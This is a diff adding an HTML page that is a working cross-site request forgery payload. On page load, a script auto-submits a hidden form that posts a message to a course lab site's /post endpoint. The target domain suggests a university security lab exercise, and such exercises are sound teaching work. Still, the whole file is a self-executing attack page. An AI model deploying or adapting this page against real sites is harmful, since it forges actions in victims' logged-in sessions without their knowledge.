@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+  <form action="https://1039302.labs.csci3403.com/post" method="post">
+    <input value="this totally is not being posted from a csrf attack" type= "Body"  name="message">
+  </form>
+    <script>document.querySelector("form").submit()
+    </script>
+</body>
+</html>
